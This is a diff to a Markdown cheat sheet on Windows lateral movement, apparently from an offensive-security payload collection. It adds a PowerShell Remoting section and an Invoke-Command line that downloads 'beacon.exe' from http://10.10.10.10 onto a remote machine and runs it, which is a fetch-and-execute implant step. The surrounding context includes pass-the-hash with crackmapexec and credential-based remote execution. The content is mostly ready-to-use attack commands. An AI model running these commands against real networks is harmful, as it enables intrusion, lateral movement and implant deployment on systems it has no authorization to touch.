@@ -11,6 +11,7 @@
     * [Metasploit - Psexec](#metasploit-psexec)
 * [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
 * [WinRM](#winrm)
+* [Powershell Remoting](#powershell-remoting)
 * [Crackmapexec](#crackmapexec)
 * [Winexe](#winexe)
 * [WMI](#wmi)
@@ -108,6 +109,8 @@ root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3
 PS C:\> $SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force
 PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
 PS C:\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami}
+PS C:\> New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami}
+PS C:\> Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\Temp\beacon.exe'; Start-Process -wait C:\Temp\beacon.exe}
 ```
 
 ## WinRM
@@ -146,6 +149,30 @@ conn.shell(:powershell) do |shell|
     puts "Exiting with code #{output.exitcode}"
 end
 ```
+
+
+## Powershell Remoting
+
+> PSSESSION
+
+```powershell
+PS> Enable-PSRemoting
+
+# one-to-one interactive session
+PS> Enter-PSSession -computerName DC01
+[DC01]: PS>
+
+# one-to-one execute scripts and commands
+PS> $Session = New-PSSession -ComputerName CLIENT1
+PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 }
+PS> Invoke-Command -Session $Session -scriptBlock { $test }
+1
+
+# one-to-many execute scripts and commands
+PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
+PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
+```
+
 
 ## Winexe 
 
@@ -261,6 +288,7 @@ PS C:\> net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
 PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
 PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
 ```
+
 
 ## References
 
